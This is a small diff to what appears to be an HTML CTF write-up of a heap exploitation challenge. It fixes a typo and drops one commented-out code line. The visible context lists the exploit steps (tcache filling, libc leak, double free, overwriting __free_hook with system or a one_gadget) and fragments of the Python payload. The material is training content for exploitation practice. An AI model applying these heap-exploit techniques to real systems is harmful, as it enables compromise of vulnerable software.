@@ -138,7 +138,7 @@ PIE:      PIE enabled
 <li>Delete chunk #0 8 time to fill tcache and get unsorted bin</li>
 <li>Leak libc with view(0)</li>
 <li>Do Double free on chunk #1</li>
-<li>Arbitary Write to __free_hook</li>
+<li>Arbitrary Write to __free_hook</li>
 <li>Change with system or one_gadgets (my payload use one_gadgets)</li>
 </ol>
 <h3 id="payload-1">Payload</h3>
@@ -191,7 +191,6 @@ uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</sp
 	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(idx))
 
 add(<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">&#34;A&#34;</span>)
-<span style="color:#75715e"># add(160,&#34;AAAA&#34;)</span>
 add(<span style="color:#ae81ff">18</span>,<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
